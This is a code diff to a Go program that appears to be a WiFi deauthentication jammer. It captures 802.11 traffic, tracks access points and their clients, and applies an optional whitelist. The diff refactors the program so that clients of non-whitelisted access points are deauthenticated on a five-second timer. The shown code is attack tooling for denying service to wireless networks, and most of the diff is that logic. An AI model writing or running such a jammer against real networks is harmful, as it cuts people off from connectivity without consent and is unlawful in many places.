@@ -2,7 +2,6 @@ package main
 
 import (
 	"fmt"
-	"github.com/dauie/go-netlink/nl80211"
 	"log"
 	"math/rand"
 	"net"
@@ -11,6 +10,7 @@ import (
 	"syscall"
 	"time"
 
+	"github.com/dauie/go-netlink/nl80211"
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 )
@@ -19,7 +19,7 @@ import (
 var QuitSIGINT = false
 
 func help() {
-	fmt.Printf("useage: ./%s <iface> <whitelist>\n", os.Args[0])
+	fmt.Printf("useage: %s <iface> <whitelist | 'none'>\n", os.Args[0])
 	os.Exit(1)
 }
 
@@ -35,9 +35,9 @@ func handleSigInt() {
 	signal.Notify(sigc, syscall.SIGINT)
 }
 
-func checkComms(conn *JamConn, aps *List, clients *List, pkt gopacket.Packet) {
+func checkComms(aps *List, clients *List, pkt gopacket.Packet) {
 
-	var cli Client
+	var cli *Client
 	var ap Ap
 	var cliAddr net.HardwareAddr
 	var apAddr net.HardwareAddr
@@ -53,10 +53,6 @@ func checkComms(conn *JamConn, aps *List, clients *List, pkt gopacket.Packet) {
 	}
 	tap := radioTap.(*layers.RadioTap)
 	dot := dot11.(*layers.Dot11)
-	// Wireless to wireless comms?
-	//if dot.Flags.FromDS() || dot.Flags.ToDS() {
-	//	return
-	//}
 	// originated from client?
 	if dot.Address1.String() != dot.Address3.String() {
 		cliAddr = dot.Address1
@@ -69,33 +65,27 @@ func checkComms(conn *JamConn, aps *List, clients *List, pkt gopacket.Packet) {
 	if len(apAddr.String()) < 16 {
 		return
 	}
-	a, ok := aps.Get(apAddr.String()[:16])
-	if !ok {
+	if a, ok := aps.Get(apAddr.String()[:16]); ok {
+		ap = (a).(Ap)
+	} else {
 		return
 	}
-	ap = (a).(Ap)
 	if v, ok := clients.Get(cliAddr.String()); ok {
-		cli = (v).(Client)
+		cli = (v).(*Client)
 	} else {
-		cli = Client{ hwaddr: cliAddr, lastDeauth: time.Now() }
+		cli = new(Client)
+		cli.hwaddr = cliAddr
 	}
 	if fromClient {
+		cli.dot = *dot
 		cli.tap = *tap
-		if time.Since(cli.lastDeauth) > time.Second * 5 {
-			if err := conn.Deauthenticate(cliAddr, apAddr, tap, dot); err != nil {
-				fmt.Println("error deauthing")
-			}
-			cli.lastDeauth = time.Now()
-		}
-		clients.Add(cli.hwaddr.String(), cli)
 	} else {
+		ap.dot = *dot
 		ap.tap = *tap
-		if _, ok := ap.GetClient(cli.hwaddr); !ok {
-			fmt.Printf("adding client %s to %s\n", cli.hwaddr.String(), ap.ssid)
-			ap.AddClient(cli)
-		}
-		aps.Add(ap.hwaddr.String()[0:16], ap)
 	}
+	clients.Add(cli.hwaddr.String(), cli)
+	ap.AddClient(cli)
+	aps.Add(ap.hwaddr.String()[0:16], ap)
 }
 
 func initEnv() {
@@ -144,6 +134,7 @@ func main() {
 	var clients List
 	packSrc := gopacket.NewPacketSource(monIfa.handle, monIfa.handle.LinkType())
 	monIfa.SetLastChanSwitch(time.Now())
+	monIfa.SetLastDeauth(time.Now())
 	for !QuitSIGINT {
 		packet, err := packSrc.NextPacket()
 		if err != nil {
@@ -151,9 +142,9 @@ func main() {
 				log.Fatalln("gopacket.PacketSource.NextPacket()", err.Error())
 			}
 		}
-		checkComms(monIfa, &apList, &clients, packet)
+		checkComms(&apList, &clients, packet)
 		monIfa.ChangeChanIfPast(time.Second * 5)
+		monIfa.DeauthClientsIfPast(time.Second * 5,2,  &apList)
 		monIfa.DoAPScanIfPast(time.Minute * 1, &whiteList, &apList)
 	}
 }
-
